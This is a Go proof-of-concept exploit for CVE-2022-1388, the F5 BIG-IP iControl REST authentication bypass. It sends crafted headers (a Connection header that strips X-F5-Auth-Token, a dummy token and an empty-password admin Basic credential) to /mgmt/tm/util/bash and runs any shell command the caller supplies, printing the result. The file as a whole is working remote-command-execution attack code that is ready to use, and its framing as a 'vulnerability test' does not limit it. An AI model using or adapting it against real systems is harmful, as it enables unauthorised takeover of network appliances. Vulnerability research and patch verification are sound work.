package cve_2022_1388

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/imroc/req/v3"
	"os"
	"strings"
)

type result struct {
	Kind          string `json:"kind"`
	Command       string `json:"command"`
	UtilCmdArgs   string `json:"utilCmdArgs"`
	CommandResult string `json:"commandResult"`
}

var (
	urlBase string
)

func Poc(urlInput, command string) {
	if strings.HasSuffix(urlInput, `/`) {
		urlInput = strings.TrimRight(urlInput, `/`)
	}
	urlBase = urlInput
	if command == "" {
		color.Green("[+] Start test target: %s", urlBase)
	} else {
		color.Green("[+] Start test target: %s; command: %s", urlBase, command)
	}

	urlIndex := urlBase + "/mgmt/tm/util/bash"
	client := req.C()
	client.EnableForceHTTP1()
	client.EnableInsecureSkipVerify()
	// client.SetProxyURL("http://127.0.0.1:8080")
	customHeader := map[string]string{
		"Host":            "localhost",
		"User-Agent":      "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
		"Content-type":    "application/json",
		"Connection":      "close,X-F5-Auth-Token",
		"X-F5-Auth-Token": "anything",
		"Authorization":   "Basic YWRtaW46",
	}
	payload := map[string]string{
		"command":     "run",
		"utilCmdArgs": "-c id",
	}
	if command != "" {
		payload["utilCmdArgs"] = fmt.Sprintf("-c %s", command)
	}
	var respResults result
	resp, err := client.R().SetHeaders(customHeader).SetBodyJsonMarshal(payload).SetResult(&respResults).Post(urlIndex)
	if err != nil {
		color.Red("[-] Error: %s", err.Error())
		color.Red("[-] Check Error")
		os.Exit(0)
	}

	if resp.IsSuccess() && strings.Contains(resp.String(), `commandResult`) {
		if command != "" {
			color.Green("[+] Command result: %s", strings.TrimRight(respResults.CommandResult, "\n"))
		}
		color.Green("[+] Target: %s is vulnerable", urlBase)
	} else {
		color.Red("[+] Target: %s is not vulnerable", urlBase)
	}
}
